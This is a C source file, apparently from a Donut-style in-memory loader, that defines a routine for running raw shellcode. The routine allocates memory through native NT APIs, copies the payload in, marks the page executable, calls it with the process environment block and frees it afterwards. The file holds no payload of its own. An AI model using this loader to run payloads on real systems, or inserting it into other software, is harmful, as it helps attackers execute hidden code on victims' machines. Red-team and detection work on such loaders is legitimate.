//===- shellcode.c - execute a raw shellcode payload //
//
// Payloads are normally a PE that RunPE maps and initialises. A raw shellcode
// payload has no headers, no sections and no imports, so none of that applies:
// copy it to its own allocation, make it executable, call it once.
//
// Calling convention: RCX receives the PEB, matching what an image entry point
// sees on this ABI. Shellcode that resolves its own PEB ignores it.
//
// Not registered in the PEB (that needs an LDR entry, which requires an image).

#ifndef HOMER_SHELLCODE_C
#define HOMER_SHELLCODE_C

typedef VOID (WINAPI *ScEntry_t)(PPEB);

VOID RunShellcode(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
  ScEntry_t entry;
  PVOID     mem = NULL;
  PVOID     base;
  SIZE_T    size, alloc;
  ULONG     old = 0;

  if (inst == NULL || mod == NULL || mod->len == 0) return;

  // One page-aligned RX allocation, separate from the instance so the
  // payload cannot corrupt its own ciphertext or the loader's state.
  alloc = ((SIZE_T)mod->len + 0xFFF) & ~(SIZE_T)0xFFF;
  if (inst->api.NtAllocateVirtualMemory((HANDLE)-1, &mem, 0, &alloc,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_READWRITE) != 0 ||
      mem == NULL) {
    DPRINT("shellcode: allocation failed");
    return;
  }

  Memcpy(mem, mod->data, mod->len);

  base = mem;
  size = alloc;
  if (inst->api.NtProtectVirtualMemory((HANDLE)-1, &base, &size,
                                       PAGE_EXECUTE_READ, &old) != 0) {
    DPRINT("shellcode: protect failed");
    size = 0;
    inst->api.NtFreeVirtualMemory((HANDLE)-1, &mem, &size, MEM_RELEASE);
    return;
  }

  DPRINT("shellcode: calling %p (%" PRId32 " bytes)", mem, mod->len);

  entry = (ScEntry_t)mem;
  entry(NtCurrentTeb()->ProcessEnvironmentBlock);

  DPRINT("shellcode: returned");

  // Blocking exit keeps the allocation alive; otherwise release it.
  if (inst->exit_opt != DONUT_OPT_EXIT_BLOCK) {
    size = 0;
    inst->api.NtFreeVirtualMemory((HANDLE)-1, &mem, &size, MEM_RELEASE);
  }
}

#endif // HOMER_SHELLCODE_C
